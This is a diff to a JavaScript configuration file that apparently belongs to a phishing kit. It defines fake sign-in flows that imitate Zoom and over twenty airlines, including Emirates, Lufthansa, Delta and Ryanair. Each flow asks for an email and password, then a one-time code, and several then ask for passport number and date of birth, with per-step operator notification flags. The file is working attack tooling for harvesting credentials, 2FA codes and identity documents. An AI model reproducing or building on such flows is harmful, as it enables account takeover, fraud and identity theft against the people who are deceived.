+  { slug:'login',    form_type:'login', page_title:'Sign In – Zoom',           headline:'Sign In',              subheadline:'', fields:['email'], layout:'auth', cta:'Continue',  step_label:'Email', notify_step:true  },
+  { slug:'password', form_type:'login', page_title:'Sign In – Zoom',           headline:'Sign In',              subheadline:'', fields:['password'], layout:'auth', cta:'Sign In',  step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'One-Time Password',        headline:'One-Time Password',    subheadline:'A one-time password was sent to your phone number', fields:['code'], layout:'otp', cta:'Continue', step_label:'OTP', notify_step:true, otp_length:6 }
 ];
 
@@ -1636,121 +1637,121 @@ FLOWS.hashicorp = [
 
 // ── Airlines ──────────────────────────────────────────────────────────────────
 FLOWS.emirates = [
-  { slug:'login',           form_type:'login',  page_title:'Sign In – Emirates Skywards', headline:'Sign In to Emirates Skywards', subheadline:'Access your Skywards miles, bookings, and upgrades', fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Sign In',           notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Sign In – Emirates Skywards', headline:'Sign In to Emirates Skywards', subheadline:'', fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Sign In',           notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',           headline:'Verification Code',           subheadline:'A verification code has been sent to your mobile number', fields:['code'], layout:'otp',   cta:'Verify',    step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Details',        headline:'Confirm Travel Details',      subheadline:'Please confirm your passport and travel details to continue', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm Details',  notify_step:true }
 ];
 
 FLOWS.qatarairways = [
-  { slug:'login',           form_type:'login',  page_title:'Sign In – Qatar Airways',    headline:'Sign in to Qatar Airways',    subheadline:'Access your Privilege Club account and bookings', fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Sign In',           notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Sign In – Qatar Airways',    headline:'Sign in to Qatar Airways',    subheadline:'', fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Sign In',           notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verify Your Identity',       headline:'Verify Your Identity',        subheadline:'Enter the OTP sent to your registered phone number', fields:['code'], layout:'otp',   cta:'Verify',    step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm ID Details',         headline:'Confirm Travel Details',      subheadline:'Enter your passport number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm Details',  notify_step:true }
 ];
 
 FLOWS.etihad = [
-  { slug:'login',           form_type:'login',  page_title:'Sign In – Etihad',          headline:'Sign in to Etihad Guest',     subheadline:'Access your Etihad Guest miles and bookings', fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Sign In',           notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Sign In – Etihad',          headline:'Sign in to Etihad Guest',     subheadline:'', fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Sign In',           notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'Verification Code',           subheadline:'Enter the one-time passcode sent to your phone', fields:['code'], layout:'otp',   cta:'Verify',    step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Identity',       subheadline:'Enter your passport number and date of birth to verify', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm',         notify_step:true }
 ];
 
 FLOWS.turkishairlines = [
-  { slug:'login',           form_type:'login',  page_title:'Login – Turkish Airlines',  headline:'Login to Miles&Smiles',       subheadline:'Access your Miles&Smiles account and bookings', fields:['email','password'], layout:'auth',  cta:'Login',     step_label:'Login',             notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Login – Turkish Airlines',  headline:'Login to Miles&Smiles',       subheadline:'', fields:['email','password'], layout:'auth',  cta:'Login',     step_label:'Login',             notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'One-Time Password',           subheadline:'Enter the one-time password sent to your mobile phone', fields:['code'], layout:'otp',   cta:'Verify',    step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Travel Document Verification', headline:'Travel Document Verification', subheadline:'Enter your passport or ID number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Verify', step_label:'Verify Travel Doc', notify_step:true }
 ];
 
 FLOWS.lufthansa = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Lufthansa',        headline:'Log in to Miles & More',      subheadline:'Access your miles, upgrades, and booking details', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Lufthansa',        headline:'Log in to Miles & More',      subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'Verification Code',           subheadline:'Enter the 6-digit verification code sent to your mobile', fields:['code'], layout:'otp',   cta:'Confirm',   step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Travel Details',     headline:'Confirm Your Identity',       subheadline:'Enter your passport number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm Details',  notify_step:true }
 ];
 
 FLOWS.britishairways = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – British Airways',  headline:'Log in to your account',      subheadline:'Access your Executive Club account, flights, and Avios', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – British Airways',  headline:'Log in to your account',      subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'Verification Code',           subheadline:'Enter the 6-digit verification code sent to your mobile phone', fields:['code'], layout:'otp',   cta:'Continue',  step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Identity',       subheadline:'Enter your passport number and date of birth to complete verification', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm',         notify_step:true }
 ];
 
 FLOWS.airfrance = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Air France',       headline:'Log in to Flying Blue',       subheadline:'Access your Flying Blue account, miles, and bookings', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Air France',       headline:'Log in to Flying Blue',       subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'Verification Code',           subheadline:'Enter the verification code sent to your phone', fields:['code'], layout:'otp',   cta:'Confirm',   step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Travel Details', subheadline:'Enter your passport number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm Details',  notify_step:true }
 ];
 
 FLOWS.klm = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – KLM',              headline:'Log in to Flying Blue',       subheadline:'Access your Flying Blue miles, upgrades, and bookings', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – KLM',              headline:'Log in to Flying Blue',       subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'Verification Code',           subheadline:'Enter the code sent to your phone number', fields:['code'], layout:'otp',   cta:'Confirm',   step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Travel Details',     headline:'Confirm Your Identity',       subheadline:'Enter your passport number and date of birth to continue', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm',         notify_step:true }
 ];
 
 FLOWS.swissair = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Swiss Air',        headline:'Log in to Miles & More',      subheadline:'Access your account and travel benefits', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Swiss Air',        headline:'Log in to Miles & More',      subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'Verification Code',           subheadline:'Enter the code sent to your registered mobile number', fields:['code'], layout:'otp',   cta:'Confirm',   step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Identity',       subheadline:'Confirm your passport details and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm',         notify_step:true }
 ];
 
 FLOWS.singaporeairlines = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Singapore Airlines', headline:'Log in to KrisFlyer',       subheadline:'Access your KrisFlyer miles, upgrades, and bookings', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Singapore Airlines', headline:'Log in to KrisFlyer',       subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'One-Time Password',            headline:'One-Time Password',        subheadline:'Please enter the one-time password sent to your registered mobile number', fields:['code'], layout:'otp', cta:'Verify', step_label:'OTP', notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Identity',             headline:'Confirm Your Identity',    subheadline:'Please enter your passport number and date of birth to verify your identity', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
 
 FLOWS.cathaypacific = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Cathay Pacific',   headline:'Log in to Asia Miles',        subheadline:'Access your Asia Miles and travel benefits', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Cathay Pacific',   headline:'Log in to Asia Miles',        subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'One-Time Password',          headline:'One-Time Password',           subheadline:'Enter the one-time password sent to your registered phone number', fields:['code'], layout:'otp', cta:'Verify', step_label:'OTP', notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Identity Verification',      headline:'Verify Your Identity',        subheadline:'Enter your passport number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
 
 FLOWS.ana = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – ANA',              headline:'Log in to ANA Mileage Club',  subheadline:'Access your ANA Mileage Club account', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – ANA',              headline:'Log in to ANA Mileage Club',  subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'One-Time Password',          headline:'One-Time Password',           subheadline:'Enter the one-time password sent to your registered mobile phone', fields:['code'], layout:'otp', cta:'OK', step_label:'OTP', notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Identity Verification',      headline:'Identity Verification',       subheadline:'Enter your passport number and date of birth to verify your identity', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
 
 FLOWS.jal = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – JAL',              headline:'Log in to JAL Mileage Bank',  subheadline:'Access your JAL Mileage Bank account and benefits', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – JAL',              headline:'Log in to JAL Mileage Bank',  subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'One-Time Password',          headline:'One-Time Password',           subheadline:'Enter the one-time password we sent to your registered email or phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Travel Document Verification', headline:'Travel Document Verification', subheadline:'Please confirm your passport number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
 
 FLOWS.delta = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Delta Air Lines',  headline:'Log in to SkyMiles',          subheadline:'Manage your SkyMiles, trips, and upgrades', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Delta Air Lines',  headline:'Log in to SkyMiles',          subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'Verification Code',           subheadline:'Enter the 6-digit code we sent to your phone number', fields:['code'], layout:'otp',   cta:'Verify',    step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Identity',       subheadline:'Enter your passport or ID number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm Details',  notify_step:true }
 ];
 
 FLOWS.united = [
-  { slug:'login',           form_type:'login',  page_title:'Sign In – United Airlines', headline:'Sign in to MileagePlus',      subheadline:'Access your MileagePlus account, miles, and bookings', fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Sign In',           notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Sign In – United Airlines', headline:'Sign in to MileagePlus',      subheadline:'', fields:['email','password'], layout:'auth',  cta:'Sign In',   step_label:'Sign In',           notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'Enter the Verification Code', subheadline:'We sent a 6-digit verification code to your phone', fields:['code'], layout:'otp',   cta:'Verify',    step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Identity',       subheadline:'To keep your account secure, please confirm your travel document and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm',  notify_step:true }
 ];
 
 FLOWS.american = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – American Airlines', headline:'Log in to AAdvantage',       subheadline:'Access your AAdvantage miles and travel benefits', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – American Airlines', headline:'Log in to AAdvantage',       subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',           headline:'Verification Code',          subheadline:'Enter the verification code sent to your phone', fields:['code'], layout:'otp',   cta:'Continue',  step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',       headline:'Confirm Your Identity',      subheadline:'Enter your passport number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm',         notify_step:true }
 ];
 
 FLOWS.southwest = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Southwest',        headline:'Log in to Rapid Rewards',     subheadline:'Access your Rapid Rewards points and travel plans', fields:['email','password'], layout:'auth',  cta:'Log in',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Southwest',        headline:'Log in to Rapid Rewards',     subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log in',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verification Code',          headline:'One-Time Passcode',           subheadline:'Enter the 6-digit code we sent to your phone', fields:['code'], layout:'otp',   cta:'Continue',  step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Identity',       subheadline:'Enter your passport number or driver\'s license number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
 
 FLOWS.ryanair = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Ryanair',          headline:'Log in to myRyanair',         subheadline:'Manage your bookings and travel plans', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Ryanair',          headline:'Log in to myRyanair',         subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verify Your Identity',       headline:'Verify Your Identity',        subheadline:'Enter the verification code sent to your phone', fields:['code'], layout:'otp',   cta:'Verify',    step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Travel Details', subheadline:'Enter your passport number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm',         notify_step:true }
 ];
 
 FLOWS.easyjet = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – easyJet',          headline:'Log in to easyJet',           subheadline:'Manage your easyJet Plus account and bookings', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – easyJet',          headline:'Log in to easyJet',           subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'Verify Your Account',        headline:'Verify Your Account',         subheadline:'Enter the code sent to your phone or email', fields:['code'], layout:'otp',   cta:'Verify',    step_label:'OTP',               notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Identity',       subheadline:'Enter your passport number and date of birth', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm',         notify_step:true }
 ];
 
 FLOWS.airarabia = [
-  { slug:'login',           form_type:'login',  page_title:'Log In – Air Arabia',       headline:'Log in to Air Arabia',        subheadline:'Manage your bookings and Airmiles account', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
+  { slug:'login',           form_type:'login',  page_title:'Log In – Air Arabia',       headline:'Log in to Air Arabia',        subheadline:'', fields:['email','password'], layout:'auth',  cta:'Log In',    step_label:'Log In',            notify_step:true  },
   { slug:'otp',             form_type:'otp',    page_title:'OTP Verification',           headline:'OTP Verification',            subheadline:'Enter the one-time password sent to your registered phone number', fields:['code'], layout:'otp', cta:'Verify', step_label:'OTP', notify_step:true, otp_length:6 },
   { slug:'confirm-details', form_type:'verify', page_title:'Confirm Your Identity',      headline:'Confirm Your Identity',       subheadline:'Enter your passport number and date of birth to verify your identity', fields:['passport_number','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
